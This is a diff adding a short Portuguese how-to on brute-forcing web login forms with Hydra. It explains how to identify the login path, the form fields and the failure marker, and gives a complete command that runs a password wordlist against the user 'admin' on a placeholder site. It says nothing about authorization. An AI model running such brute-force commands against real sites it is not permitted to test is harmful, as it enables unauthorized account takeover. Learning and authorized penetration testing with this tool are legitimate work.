@@ -1,0 +1,31 @@
+COMO FAZER O BRUTE FORCING COM O HYDRA EM SERIÇOS HTTP/HTTPS.
+
+
+	 1.VOCÊ TERÁ QUE COPIAR O DIRETÓRIO QUE ESTÁ A ABA DE LOGIN 
+		EX: /login.php 
+	
+	 2.COPIAR O NOME DO FORMULÁRIO DE USUÁRIO E DE SENHA, CHECAR SE O METODO USADO É O 	
+	 POST E COLOCAR O COMANDO DA SEGUINTE FORMA:
+	
+		http-post-form '/<aba_login>:<form_usuario>=^USER^&<form_senha>=^PASS^:login page'
+	
+		EX: <host> http-post-form '/login.php:username=^USER^&password=^PASS^:login page'
+		
+		EXEMPLO DE CÓDIGO COMPLETO: hydra -V -l admin -P /home/thxny/wordlist.txt seusite.com http-post-	
+		form '/login.php:username=^USER^&passwd=^PASS^:login page'
+		
+		OBS: O 'login page' É USADO QUANDO O SITE CONTINUA COM A MESMA URL MESMO APÓS ERRAR A SENHA.
+		
+		SE A URL MUDAR QUANDO SE ERRA A SENHA COLOQUE O TRECHO DA URL QUE ALTERA.
+		 
+			EX: '/aba_de_login:formulario_usuario=^USER^&formulario_senha=^PASS^:/errorlogin'
+		
+		SE APARECER ALGUM TEXTO DE ERRO QUANDO SE ERRA A SENHA COLOQUE ELA.
+		
+			EX: '/aba_de_login:formulario_usuario=^USER^&formulario_senha=^PASS^:senha incorreta'
+			
+		OBS: SE O SITE FOR HTTPS, TROQUE O 'http-post-form' PARA 'https-post-form'.
+		
+		
+		OBS: O NOME DO FORMULARIO DE LOGIN, HOST PODEM SER ENCONTRADOS PELA INSPEÇÃO DE ELEMENTO OU
+		POR UM PROXY QUE CAPTURE A REQUISIÇÃO.
